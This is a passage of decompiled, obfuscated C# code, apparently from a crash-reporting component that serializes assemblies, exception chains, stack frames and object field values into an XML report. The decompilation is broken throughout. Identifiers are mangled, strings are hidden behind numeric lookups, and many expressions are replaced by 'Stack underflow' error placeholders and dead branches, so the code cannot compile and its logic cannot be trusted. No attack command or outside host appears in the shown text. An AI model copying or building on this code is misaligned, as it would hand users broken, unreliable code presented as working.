			_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107396028), ((int*)ptr)->ToString());
		}

		private new void _0001(string P_0)
		{
			//IL_0011: Invalid comparison between Unknown and I4
			//IL_0058: Incompatible stack heights: 0 vs 1
			//IL_005b: Incompatible stack heights: 0 vs 1
			//IL_0062: Incompatible stack heights: 0 vs 1
			//IL_0068: Incompatible stack heights: 0 vs 1
			//IL_006e: Incompatible stack heights: 0 vs 2
			//IL_0075: Incompatible stack heights: 0 vs 2
			//IL_007c: Incompatible stack heights: 0 vs 1
			while (true)
			{
				int num;
				if (2u != 0)
				{
					if (0 == 0)
					{
						global::_0005._0011._0001((_0005)/*Error near IL_0062: Stack underflow*/, (string)/*Error near IL_0062: Stack underflow*/);
						num = (int)/*Error near IL_0065: Stack underflow*/;
						goto IL_0010;
					}
					goto IL_0032;
				}
				goto IL_0050;
				IL_0010:
				if ((int)/*Error near IL_0013: Stack underflow*/ != -1)
				{
					goto IL_0013;
				}
				goto IL_0032;
				IL_0013:
				_ = _008E._007E_0086_0003;
				_ = ((_0005)/*Error near IL_001f: Stack underflow*/)._0001;
				global::_000E._0003._0001(107396023);
				num.ToString();
				if (0 == 0)
				{
					/*Error near IL_0083: Stack underflow*/((object)/*Error near IL_0083: Stack underflow*/, (string)/*Error near IL_0083: Stack underflow*/, (string)/*Error near IL_0083: Stack underflow*/);
				}
				break;
				IL_0050:
				if (false)
				{
					goto IL_0010;
				}
				if (true)
				{
					break;
				}
				goto IL_0013;
				IL_0032:
				if (5 == 0)
				{
					continue;
				}
				_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107395982), P_0);
				goto IL_0050;
			}
		}

		private new unsafe static _0003 _0001(Type P_0)
		{
			//IL_004f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0051: Unknown result type (might be due to invalid IL or missing references)
			//IL_0053: Expected I4, but got Unknown
			//IL_00b0: Incompatible stack heights: 0 vs 1
			//IL_00bc: Incompatible stack heights: 0 vs 1
			//IL_00c2: Incompatible stack heights: 0 vs 3
			//IL_00cc: Incompatible stack heights: 0 vs 1
			//IL_00d6: Incompatible stack heights: 0 vs 1
			//IL_00e0: Incompatible stack heights: 0 vs 1
			//IL_00e6: Incompatible stack heights: 0 vs 3
			//IL_00f0: Incompatible stack heights: 0 vs 1
			_0003._0001();
			_0003 result = (_0003)/*Error near IL_00b6: Stack underflow*/;
			if ((int)/*Error near IL_0014: Stack underflow*/ != 0)
			{
				_ = _0094._007E_0092_0003;
				_ = _0093._007E_0091_0003;
				/*Error near IL_00cc: Stack underflow*/((object)/*Error near IL_00cc: Stack underflow*/);
				global::_000E._0003._0001(107395973);
				/*Error near IL_00e0: Stack underflow*/((object)/*Error near IL_00e0: Stack underflow*/, (string)/*Error near IL_00e0: Stack underflow*/);
				if ((int)/*Error near IL_0039: Stack underflow*/ != 0)
				{
					_ = ref result;
					_ = global::_0001._007E_0007;
					/*Error near IL_00f0: Stack underflow*/((object)/*Error near IL_00f0: Stack underflow*/);
					string text = ((/*Error near IL_0050: Stack underflow*/ & 0xFFFFFF) - 1).ToString();
					((_0003*)(nint)/*Error near IL_005f: Stack underflow*/)->_0001 = text;
					Assembly assembly = _0093._007E_0091_0003(P_0);
					result._0001 = new _0002(_0095._007E_0093_0003(_0092._007E_0090_0003(assembly)).ToString(global::_000E._0003._0001(107395912)), global::_0007._007E_0088(assembly));
				}
			}
			return result;
		}

		internal new unsafe void _0001(Type P_0)
		{
			//IL_0271: Incompatible stack heights: 0 vs 1
			//IL_027b: Incompatible stack heights: 0 vs 1
			//IL_028b: Incompatible stack heights: 0 vs 1
			//IL_0291: Incompatible stack heights: 0 vs 2
			//IL_029b: Incompatible stack heights: 0 vs 2
			//IL_02a1: Incompatible stack heights: 0 vs 1
			//IL_02b1: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[12];
			if ((int)/*Error near IL_0011: Stack underflow*/ == 0)
			{
				return;
			}
			try
			{
				_0005._0001((Type)/*Error near IL_027b: Stack underflow*/);
				_0003 obj = (_0003)/*Error near IL_0281: Stack underflow*/;
				obj._0001();
				int num;
				if ((int)/*Error near IL_002b: Stack underflow*/ == 0)
				{
					_ = _008E._007E_0086_0003;
					_ = ((_0005)/*Error near IL_003a: Stack underflow*/)._0001;
					global::_000E._0003._0001(107395907);
					string text = ((_0003)/*Error near IL_004e: Stack underflow*/)._0001;
					/*Error near IL_0053: Stack underflow*/((object)/*Error near IL_0053: Stack underflow*/, (string)/*Error near IL_0053: Stack underflow*/, text);
					*(int*)ptr = global::_0005._0011._0001(obj, this);
					num = *(int*)ptr;
					goto IL_005e;
				}
				string text2 = global::_0007._007E_0084(P_0);
				if (this.m__0001.ContainsKey(text2))
				{
					*(int*)((byte*)ptr + 4) = this.m__0001[text2];
				}
				else
				{
					StringBuilder stringBuilder = new StringBuilder();
					string text3 = global::_0007._007E_0089(_0096._007E_0094_0003(_0093._007E_0091_0003(P_0)));
					num = global::_0001._007E_0001(text3);
					if (4 == 0)
					{
						goto IL_005e;
					}
					if (num > 0 && global::_0008._0096(text3, global::_000E._0003._0001(107395881)))
					{
						_0090._007E_008D_0003(stringBuilder, '[');
						_0091._007E_008E_0003(stringBuilder, text3);
						_0090._007E_008D_0003(stringBuilder, ']');
					}
					string text4 = global::_0007._007E_008A(P_0);
					if (global::_0001._007E_0001(text4) > 0)
					{
						_0091._007E_008E_0003(stringBuilder, text4);
						_0090._007E_008D_0003(stringBuilder, '.');
					}
					if (_008D._007E_0014_0003(P_0))
					{
						P_0 = _008F._007E_0089_0003(P_0);
					}
					*(int*)((byte*)ptr + 8) = _0097._007E_0095_0003(text2, global::_000E._0003._0001(107395900));
					if (*(int*)((byte*)ptr + 8) > 0)
					{
						string text5 = _0012._007E_008C_0002(_001C._007E_009B_0002(text2, global::_0001._007E_0001(text4) + 1, *(int*)((byte*)ptr + 8) - global::_0001._007E_0001(text4)), global::_000E._0003._0001(107395900), global::_000E._0003._0001(107395895));
						_0091._007E_008E_0003(stringBuilder, text5);
					}
					_0091._007E_008E_0003(stringBuilder, global::_0007._007E_0083(P_0));
					*(int*)((byte*)ptr + 4) = this.m__0001.Count;
					this.m__0001.Add(global::_0007._007E_0086(stringBuilder));
					this.m__0001.Add(text2, *(int*)((byte*)ptr + 4));
				}
				_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107395890), ((int*)((byte*)ptr + 4))->ToString());
				return;
				IL_005e:
				if (num > 0)
				{
					_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107395926), ((int*)ptr)->ToString());
				}
			}
			catch
			{
			}
		}

		internal new unsafe byte[] _0001()
		{
			//IL_0d59: Incompatible stack heights: 0 vs 1
			//IL_0d5f: Incompatible stack heights: 0 vs 1
			//IL_0d65: Incompatible stack heights: 0 vs 1
			//IL_0d6f: Incompatible stack heights: 0 vs 1
			//IL_0d75: Incompatible stack heights: 0 vs 1
			//IL_0d7b: Incompatible stack heights: 0 vs 1
			//IL_0d85: Incompatible stack heights: 0 vs 2
			//IL_0d8f: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[33];
			if (((_0005)/*Error near IL_0014: Stack underflow*/).m__0001 != null)
			{
				return ((_0005)/*Error near IL_0020: Stack underflow*/).m__0001;
			}
			new MemoryStream();
			((_0005)/*Error near IL_0030: Stack underflow*/).m__0001 = (MemoryStream)/*Error near IL_0030: Stack underflow*/;
			_ = ((_0005)/*Error near IL_003f: Stack underflow*/).m__0001;
			new UTF8Encoding(encoderShouldEmitUTF8Identifier: false);
			new XmlTextWriter((Stream)/*Error near IL_0d8f: Stack underflow*/, (Encoding?)/*Error near IL_0d8f: Stack underflow*/);
			((_0005)/*Error near IL_004f: Stack underflow*/)._0001 = (XmlWriter)/*Error near IL_004f: Stack underflow*/;
			global::_000F._007E_009A(this._0001);
			global::_0004._0007 obj = new global::_0004._0007(this._0001, global::_000E._0003._0001(107395845));
			try
			{
				_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107395300), global::_0007._008B(global::_000E._0003._0001(107395315)));
				_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107395262), _0098._0097_0003().ToString(global::_000E._0003._0001(107395249)));
				_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107395212), global::_0005._0011._0001());
				if (_0099._0098_0003(this.m__0001, Guid.Empty))
				{
					_008E obj2 = _008E._007E_0086_0003;
					XmlWriter xmlWriter = this._0001;
					string text = global::_000E._0003._0001(107395203);
					Guid guid = this.m__0001;
					obj2(xmlWriter, text, guid.ToString(global::_000E._0003._0001(107395912)));
				}
				_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107395226), _009A._0099_0003().ToString(global::_000E._0003._0001(107395912)));
				if (this._0001.Count > 0)
				{
					this._0001.Clear();
				}
				this._0001.Add(new _0002(global::_000E._0003._0001(107395315), string.Empty));
				if (this._0002.Count > 0)
				{
					this._0002.Clear();
				}
				this._0002.Add(global::_000E._0003._0001(107395315), 0);
				global::_0004._0007 obj3 = new global::_0004._0007(this._0001, global::_000E._0003._0001(107395181));
				try
				{
					Assembly assembly = global::_0005._0011._0001();
					Assembly[] array = global::_0005._0011._0001(this);
					*(int*)ptr = 0;
					while (*(int*)ptr < array.Length)
					{
						Assembly assembly2 = array[*(int*)ptr];
						if ((object)assembly2 != null)
						{
							global::_0004._0007 obj4 = new global::_0004._0007(this._0001, global::_000E._0003._0001(107395926));
							try
							{
								_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107395982), global::_0007._007E_0088(assembly2));
								_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107395196), global::_0007._007E_008C(assembly2));
								if ((object)assembly2 == assembly)
								{
									_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107395151), global::_000E._0003._0001(107395598));
								}
							}
							catch
							{
							}
							finally
							{
								if (obj4 != null)
								{
									global::_000F._007E_0099(obj4);
								}
							}
						}
						(*(int*)ptr)++;
					}
				}
				finally
				{
					if (obj3 != null)
					{
						global::_000F._007E_0099(obj3);
					}
				}
				obj3 = new global::_0004._0007(this._0001, global::_000E._0003._0001(107395142));
				try
				{
					if (this.m__0001 != null && this.m__0001.Count > 0)
					{
						foreach (string key in this.m__0001.Keys)
						{
							global::_0004._0007 obj4 = new global::_0004._0007(this._0001, global::_000E._0003._0001(107395117));
							try
							{
								_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107395982), key);
								string text2 = (string)this.m__0001[key];
								if (text2 == null)
								{
									_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107396074), global::_000E._0003._0001(107395598));
								}
								else
								{
									_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107396005), _0019._0098_0002(global::_000E._0003._0001(107396010), text2, global::_000E._0003._0001(107396010)));
								}
							}
							finally
							{
								if (obj4 != null)
								{
									global::_000F._007E_0099(obj4);
								}
							}
						}
					}
				}
				finally
				{
					if (obj3 != null)
					{
						global::_000F._007E_0099(obj3);
					}
				}
				if (this.m__0001 != null && this.m__0001.Count > 0)
				{
					obj3 = new global::_0004._0007(this._0001, global::_000E._0003._0001(107395128));
					try
					{
						foreach (string key2 in this.m__0001.Keys)
						{
							global::_0004._0007 obj4 = new global::_0004._0007(this._0001, global::_000E._0003._0001(107395075));
							try
							{
								_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107395090), key2);
								_0001 obj6 = this.m__0001[key2];
								_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107395565), obj6._0001);
								_008E obj7 = _008E._007E_0086_0003;
								XmlWriter xmlWriter2 = this._0001;
								string text3 = global::_000E._0003._0001(107395552);
								*(int*)ptr = obj6._0001;
								obj7(xmlWriter2, text3, ((int*)ptr)->ToString());
								if (global::_0001._007E_0001(obj6._0003) > 0)
								{
									_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107395575), obj6._0003);
								}
								else
								{
									_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107395534), obj6._0002);
								}
							}
							finally
							{
								if (obj4 != null)
								{
									global::_000F._007E_0099(obj4);
								}
							}
						}
					}
					finally
					{
						if (obj3 != null)
						{
							global::_000F._007E_0099(obj3);
						}
					}
				}
				obj3 = new global::_0004._0007(this._0001, global::_000E._0003._0001(107395525));
				try
				{
					Version version = _009B._009A_0003();
					Version version2 = _009D._007E_009C_0003(_009C._009B_0003());
					string text4 = _009E._007E_009D_0003(_009C._009B_0003()).ToString();
					global::_0002._0002 obj8 = default(global::_0002._0002);
					global::_0005._0011._0001(out string text5, ref version, ref obj8, ref *(bool*)((byte*)ptr + 32), out text4, out version2);
					_008E._007E_0087_0003(this._0001, global::_000E._0003._0001(107395500), global::_0007._007E_0086(version));
					_008E._007E_0087_0003(this._0001, global::_000E._0003._0001(107395515), global::_0007._007E_0086(version2));
					_008E._007E_0087_0003(this._0001, global::_000E._0003._0001(107395470), text4);
					_008E._007E_0087_0003(this._0001, global::_000E._0003._0001(107395485), text5);
					_008E._007E_0087_0003(this._0001, global::_000E._0003._0001(107395432), global::_0005._0011._0001());
					this._0001.WriteElementString(global::_000E._0003._0001(107395447), global::_0005._0011._0001() ? global::_000E._0003._0001(107395598) : global::_000E._0003._0001(107395402));
					this._0001.WriteElementString(global::_000E._0003._0001(107395397), global::_0005._0011._0001() ? global::_000E._0003._0001(107395598) : global::_000E._0003._0001(107395402));
					this._0001.WriteElementString(global::_000E._0003._0001(107395392), global::_0005._0011._0001() ? global::_000E._0003._0001(107395598) : global::_000E._0003._0001(107395402));
				}
				catch
				{
				}
				finally
				{
					if (obj3 != null)
					{
						global::_000F._007E_0099(obj3);
					}
				}
				List<Exception> list = new List<Exception>();
				for (Exception ex = this.m__0001; ex != null; ex = _009F._007E_009E_0003(ex))
				{
					list.Add(ex);
				}
				list.Reverse();
				obj3 = new global::_0004._0007(this._0001, global::_000E._0003._0001(107395375));
				try
				{
					foreach (Exception item in list)
					{
						try
						{
							global::_0005._0011._0001(this, item);
							if (!_0002_0002._007E_0002_0004(_0001_0002._007E_0001_0004(item), global::_000E._0003._0001(107395390)))
							{
								continue;
							}
							_0004_0002 obj10 = _0004_0002._007E_0005_0004;
							ICollection obj11 = (ICollection)_0003_0002._007E_0003_0004(_0001_0002._007E_0001_0004(item), global::_000E._0003._0001(107395390));
							int count = obj11.Count;
							*(int*)((byte*)ptr + 4) = 0;
							IEnumerator enumerator4 = obj10(obj11);
							try
							{
								while (_008D._007E_001B_0003(enumerator4))
								{
									object obj12 = _0005_0002._007E_0007_0004(enumerator4);
									try
									{
										Type type = _008F._007E_008A_0003(obj12);
										(*(int*)((byte*)ptr + 4))++;
										if (false)
										{
											continue;
										}
										if (*(int*)((byte*)ptr + 4) > 100 && *(int*)((byte*)ptr + 4) == count - 100)
										{
											global::_0004._0007 obj4 = new global::_0004._0007(this._0001, global::_000E._0003._0001(107395333));
											try
											{
												_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107395344), count.ToString());
											}
											finally
											{
												if (obj4 != null)
												{
													global::_000F._007E_0099(obj4);
												}
											}
										}
										else
										{
											if (*(int*)((byte*)ptr + 4) > 100 && *(int*)((byte*)ptr + 4) <= count - 100)
											{
												continue;
											}
											*(int*)((byte*)ptr + 8) = (int)_0003_0002._007E_0004_0004(_0006_0002._007E_000F_0004(type, global::_000E._0003._0001(107394807)), obj12);
											*(int*)((byte*)ptr + 12) = (int)_0003_0002._007E_0004_0004(_0006_0002._007E_000F_0004(type, global::_000E._0003._0001(107394762)), obj12);
											*(int*)((byte*)ptr + 16) = (int)_0003_0002._007E_0004_0004(_0006_0002._007E_000F_0004(type, global::_000E._0003._0001(107394781)), obj12);
											object[] array2 = (object[])_0003_0002._007E_0004_0004(_0006_0002._007E_000F_0004(type, global::_000E._0003._0001(107394720)), obj12);
											_0003 obj13 = _0005._0001(type);
											if (obj13._0001())
											{
												continue;
											}
											global::_0004._0007 obj4 = new global::_0004._0007(this._0001, global::_000E._0003._0001(107394739));
											try
											{
												_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107394807), ((int*)((byte*)ptr + 8))->ToString());
												_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107394781), ((int*)((byte*)ptr + 16))->ToString());
												*(int*)((byte*)ptr + 20) = global::_0005._0011._0001(obj13, this);
												if (*(int*)((byte*)ptr + 20) > 0)
												{
													_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107395926), ((int*)((byte*)ptr + 20))->ToString());
												}
												if (*(int*)((byte*)ptr + 12) != -1)
												{
													_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107394762), ((int*)((byte*)ptr + 12))->ToString());
												}
												object[] array3 = array2;
												*(int*)ptr = 0;
												while (*(int*)ptr < array3.Length)
												{
													object obj14 = array3[*(int*)ptr];
													try
													{
														_0001(new global::_0004._0005(obj14, true), null);
													}
													catch
													{
													}
													(*(int*)ptr)++;
												}
											}
											finally
											{
												if (obj4 != null)
												{
													global::_000F._007E_0099(obj4);
												}
											}
											continue;
										}
									}
									catch
									{
									}
								}
							}
							finally
							{
								if (enumerator4 is IDisposable disposable)
								{
									global::_000F._007E_0099(disposable);
								}
							}
						}
						catch
						{
						}
					}
				}
				finally
				{
					if (obj3 != null)
					{
						global::_000F._007E_0099(obj3);
					}
				}
				this._0001();
				obj3 = new global::_0004._0007(this._0001, global::_000E._0003._0001(107394690));
				try
				{
					_008E obj18 = _008E._007E_0086_0003;
					XmlWriter xmlWriter3 = this._0001;
					string text6 = global::_000E._0003._0001(107394709);
					*(int*)ptr = this.m__0001.Count;
					obj18(xmlWriter3, text6, ((int*)ptr)->ToString());
					*(int*)((byte*)ptr + 24) = 0;
					while (*(int*)((byte*)ptr + 24) < this.m__0001.Count)
					{
						string text7;
						try
						{
							text7 = global::_0007._007E_0086(this.m__0001[*(int*)((byte*)ptr + 24)]);
						}
						catch (Exception ex2)
						{
							text7 = _0019._0098_0002(global::_000E._0003._0001(107396010), global::_0007._007E_008D(ex2), global::_000E._0003._0001(107396010));
						}
						_008E._007E_0087_0003(this._0001, global::_000E._0003._0001(107395890), text7);
						(*(int*)((byte*)ptr + 24))++;
					}
				}
				finally
				{
					if (obj3 != null)
					{
						global::_000F._007E_0099(obj3);
					}
				}
				obj3 = new global::_0004._0007(this._0001, global::_000E._0003._0001(107394668));
				try
				{
					_008E obj19 = _008E._007E_0086_0003;
					XmlWriter xmlWriter4 = this._0001;
					string text8 = global::_000E._0003._0001(107394709);
					*(int*)ptr = this._0001.Count;
					obj19(xmlWriter4, text8, ((int*)ptr)->ToString());
					*(int*)((byte*)ptr + 28) = 0;
					while (*(int*)((byte*)ptr + 28) < this._0001.Count)
					{
						global::_0004._0007 obj4 = new global::_0004._0007(this._0001, global::_000E._0003._0001(107395300));
						try
						{
							_0002 obj20 = this._0001[*(int*)((byte*)ptr + 28)];
							_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107396028), obj20._0001);
							if (global::_0001._007E_0001(obj20._0002) > 0)
							{
								_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107394683), obj20._0002);
							}
						}
						finally
						{
							if (obj4 != null)
							{
								global::_000F._007E_0099(obj4);
							}
						}
						(*(int*)((byte*)ptr + 28))++;
					}
				}
				finally
				{
					if (obj3 != null)
					{
						global::_000F._007E_0099(obj3);
					}
				}
			}
			finally
			{
				if (obj != null)
				{
					global::_000F._007E_0099(obj);
				}
			}
			global::_000F._007E_009B(this._0001);
			global::_000F._007E_009C(this._0001);
			global::_000F._007E_009D(this.m__0001);
			this.m__0001 = _0007_0002._007E_0010_0004(this.m__0001);
			return this.m__0001;
		}

		private new unsafe void _0001()
		{
			//IL_057b: Incompatible stack heights: 0 vs 1
			//IL_0581: Incompatible stack heights: 0 vs 1
			//IL_0587: Incompatible stack heights: 0 vs 2
			//IL_0591: Incompatible stack heights: 0 vs 1
			//IL_05ad: Incompatible stack heights: 0 vs 1
			//IL_05b7: Incompatible stack heights: 0 vs 2
			//IL_05c1: Incompatible stack heights: 0 vs 1
			void* ptr;
			do
			{
				ptr = stackalloc byte[25];
			}
			while (3 == 0);
			_ = ((_0005)/*Error near IL_0017: Stack underflow*/)._0001;
			global::_000E._0003._0001(107394720);
			new global::_0004._0007((XmlWriter)/*Error near IL_05c1: Stack underflow*/, (string)/*Error near IL_05c1: Stack underflow*/);
			global::_0004._0007 obj = (global::_0004._0007)/*Error near IL_05c7: Stack underflow*/;
			try
			{
				*(int*)(nint)/*Error near IL_0032: Stack underflow*/ = 0;
				while (*(int*)ptr < this.m__0001.Count)
				{
					_ = ((_0005)/*Error near IL_0041: Stack underflow*/).m__0001;
					int index = *(int*)(nint)/*Error near IL_0047: Stack underflow*/;
					_ = ((List<global::_0004._0005>)/*Error near IL_0591: Stack underflow*/)[index];
					global::_0004._0005 obj2 = (global::_0004._0005)/*Error near IL_004d: Stack underflow*/;
					object obj3 = obj2._0001;
					Type type = obj2._0001;
					global::_0004._0007 obj4 = new global::_0004._0007(this._0001, global::_000E._0003._0001(107394638));
					try
					{
						_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107396028), ((int*)ptr)->ToString());
						string text = null;
						((byte*)ptr)[24] = 1;
						string[] array = _0008_0002._0013_0004(global::_000E._0003._0001(107396732), new char[1] { ',' });
						*(int*)((byte*)ptr + 4) = 0;
						while (*(int*)((byte*)ptr + 4) < array.Length)
						{
							string text2 = array[*(int*)((byte*)ptr + 4)];
							if (global::_0008._0096(text2, global::_000E._0003._0001(107396732)) && _000E_0002._007E_0014_0004(global::_0007._007E_0084(type), text2))
							{
								((byte*)ptr)[24] = 0;
								break;
							}
							(*(int*)((byte*)ptr + 4))++;
						}
						object[] array2 = _000F_0002._007E_0017_0004(type, true);
						*(int*)((byte*)ptr + 4) = 0;
						while (*(int*)((byte*)ptr + 4) < array2.Length)
						{
							string text3 = global::_0007._007E_0083(_008F._007E_008A_0003((Attribute)array2[*(int*)((byte*)ptr + 4)]));
							if (!global::_0008._0096(text3, global::_000E._0003._0001(107394625)) || !global::_0008._0096(text3, global::_000E._0003._0001(107394620)))
							{
								((byte*)ptr)[24] = 0;
								break;
							}
							(*(int*)((byte*)ptr + 4))++;
						}
						if (((byte*)ptr)[24] != 0)
						{
							try
							{
								text = global::_0007._007E_0086(obj3);
								text = (global::_0008._0095(text, global::_0007._007E_0084(type)) ? null : (_008D._007E_001A_0003(type) ? _0010_0002._0018_0004(type, obj3, global::_000E._0003._0001(107394591)) : ((!(obj3 is Guid)) ? _0019._0098_0002(global::_000E._0003._0001(107396010), text, global::_000E._0003._0001(107396010)) : _0019._0098_0002(global::_000E._0003._0001(107396052), text, global::_000E._0003._0001(107396015)))));
							}
							catch
							{
							}
							if (text != null)
							{
								_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107396005), global::_0005._0011._0001(text));
							}
						}
						if (_008D._007E_0014_0003(type))
						{
							this._0001(_008F._007E_0089_0003(type));
							if (_008D._007E_0015_0003(type))
							{
								_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107395593), global::_000E._0003._0001(107395598));
							}
							if (_008D._007E_0016_0003(type))
							{
								_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107395584), global::_000E._0003._0001(107395598));
							}
							if (_008D._007E_0017_0003(type))
							{
								Array array3 = (Array)obj3;
								_008E obj6 = _008E._007E_0086_0003;
								XmlWriter xmlWriter = this._0001;
								string text4 = global::_000E._0003._0001(107395603);
								*(int*)((byte*)ptr + 4) = global::_0001._007E_000E(array3);
								obj6(xmlWriter, text4, ((int*)((byte*)ptr + 4))->ToString());
								StringBuilder stringBuilder = new StringBuilder();
								*(int*)((byte*)ptr + 8) = 0;
								while (*(int*)((byte*)ptr + 8) < global::_0001._007E_000E(array3))
								{
									if (*(int*)((byte*)ptr + 8) > 0)
									{
										_0090._007E_008D_0003(stringBuilder, ',');
									}
									_0011_0002._007E_0019_0004(stringBuilder, global::_0002._007E_0017(array3, *(int*)((byte*)ptr + 8)));
									(*(int*)((byte*)ptr + 8))++;
								}
								_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107395552), global::_0007._007E_0086(stringBuilder));
								if (global::_0001._007E_000E(array3) == 1)
								{
									*(int*)((byte*)ptr + 12) = global::_0001._007E_000F(array3);
									*(int*)((byte*)ptr + 16) = 0;
									while (*(int*)((byte*)ptr + 16) < *(int*)((byte*)ptr + 12))
									{
										if (*(int*)((byte*)ptr + 16) == 10 && *(int*)((byte*)ptr + 12) > 16)
										{
											*(int*)((byte*)ptr + 16) = *(int*)((byte*)ptr + 12) - 5;
										}
										try
										{
											_0001(new global::_0004._0005(_0012_0002._007E_001A_0004(array3, *(int*)((byte*)ptr + 16)), false), null);
										}
										catch
										{
										}
										(*(int*)((byte*)ptr + 16))++;
									}
								}
							}
						}
						else
						{
							this._0001(type);
							if (obj2._0001 && ((byte*)ptr)[24] != 0)
							{
								try
								{
									if (obj3 is IEnumerable)
									{
										global::_0004._0007 obj8 = new global::_0004._0007(this._0001, global::_000E._0003._0001(107394586));
										try
										{
											*(int*)((byte*)ptr + 20) = 0;
											IEnumerator enumerator = _0004_0002._007E_0005_0004((IEnumerable)obj3);
											try
											{
												if (false)
												{
													goto IL_04c8;
												}
												while (_008D._007E_001B_0003(enumerator))
												{
													object obj9 = _0005_0002._007E_0007_0004(enumerator);
													if (*(int*)((byte*)ptr + 20) <= 20)
													{
														_0001(new global::_0004._0005(obj9, false), null);
														(*(int*)((byte*)ptr + 20))++;
														continue;
													}
													goto IL_04c8;
												}
												goto end_IL_04ac;
												IL_04c8:
												_008E._007E_0087_0003(this._0001, global::_000E._0003._0001(107395049), string.Empty);
												end_IL_04ac:;
											}
											finally
											{
												if (enumerator is IDisposable disposable)
												{
													global::_000F._007E_0099(disposable);
												}
											}
										}
										finally
										{
											if (obj8 != null)
											{
												global::_000F._007E_0099(obj8);
											}
										}
									}
								}
								catch
								{
								}
								_0002(obj2);
							}
						}
					}
					finally
					{
						if (obj4 != null)
						{
							global::_000F._007E_0099(obj4);
						}
					}
					(*(int*)ptr)++;
				}
			}
			finally
			{
				if (obj != null)
				{
					global::_000F._007E_0099(obj);
				}
			}
		}

		private unsafe void _0002(global::_0004._0005 P_0)
		{
			//IL_0108: Incompatible stack heights: 0 vs 2
			//IL_01c7: Incompatible stack heights: 0 vs 2
			//IL_01d1: Incompatible stack heights: 0 vs 1
			//IL_01dd: Incompatible stack heights: 0 vs 1
			//IL_01e3: Incompatible stack heights: 0 vs 1
			//IL_01e9: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[9];
			_ = _0013_0002._007E_001B_0004;
			Type type = ((global::_0004._0005)/*Error near IL_0019: Stack underflow*/)._0001;
			/*Error near IL_01d1: Stack underflow*/(type, BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
			FieldInfo[] array = (FieldInfo[])/*Error near IL_01d7: Stack underflow*/;
			*(int*)(nint)/*Error near IL_002c: Stack underflow*/ = 0;
			while (*(int*)ptr < array.Length)
			{
				int num = *(int*)(nint)/*Error near IL_003c: Stack underflow*/;
				FieldInfo fieldInfo = (FieldInfo)((object[])/*Error near IL_003d: Stack underflow*/)[num];
				try
				{
					_ = _008D._007E_001C_0003;
					if (!/*Error near IL_0051: Stack underflow*/((object)/*Error near IL_0051: Stack underflow*/) && (!_008D._007E_0013_0003(fieldInfo) || !_008D._007E_001D_0003(fieldInfo)))
					{
						((byte*)ptr)[8] = 1;
						object[] array2 = _000F_0002._007E_0017_0004(fieldInfo, true);
						*(int*)((byte*)ptr + 4) = 0;
						while (*(int*)((byte*)ptr + 4) < array2.Length)
						{
							if (global::_0008._0095(global::_0007._007E_0083(_008F._007E_008A_0003((Attribute)array2[*(int*)((byte*)ptr + 4)])), global::_000E._0003._0001(107394620)))
							{
								((byte*)ptr)[8] = 0;
								break;
							}
							(*(int*)((byte*)ptr + 4))++;
						}
						if (((byte*)ptr)[8] != 0)
						{
							_0001(new global::_0004._0005(_0003_0002._007E_0004_0004(fieldInfo, P_0._0001), false), fieldInfo);
						}
					}
				}
				catch
				{
				}
				(*(int*)ptr)++;
			}
			P_0 = new global::_0004._0005(P_0._0001, _008F._007E_008B_0003(P_0._0001), P_0._0001);
			if ((object)P_0._0001 == null)
			{
				return;
			}
			global::_0004._0007 obj2 = new global::_0004._0007(this._0001, global::_000E._0003._0001(107395625));
			try
			{
				_0001(global::_000E._0003._0001(107395040));
				_008E obj3 = _008E._007E_0086_0003;
				XmlWriter xmlWriter = this._0001;
				string text = global::_000E._0003._0001(107396028);
				*(int*)ptr = this.m__0001.Count;
				obj3(xmlWriter, text, ((int*)ptr)->ToString());
			}
			finally
			{
				if (obj2 != null)
				{
					global::_000F._007E_0099(obj2);
				}
			}
			this.m__0001.Add(P_0);
		}

		internal new unsafe bool _0001()
		{
			//IL_0028: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0076: Incompatible stack heights: 0 vs 1
			//IL_007d: Incompatible stack heights: 0 vs 1
			//IL_00e9: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[5];
			if (uint.MaxValue != 0)
			{
				global::_0005._0011._0001(1u);
			}
			try
			{
				global::_0005._0011._0001((_0006)/*Error near IL_00f3: Stack underflow*/, global::_000E._0005._0001);
				byte[] array;
				try
				{
					((_0005)/*Error near IL_002f: Stack underflow*/)._0001();
					array = (byte[])/*Error near IL_0032: Stack underflow*/;
				}
				catch (Exception ex)
				{
					*(int*)ptr = -1;
					try
					{
						new StackTrace((Exception)/*Error near IL_007d: Stack underflow*/);
						StackTrace stackTrace = (StackTrace)/*Error near IL_003e: Stack underflow*/;
						if (global::_0001._007E_0010(stackTrace) > 0)
						{
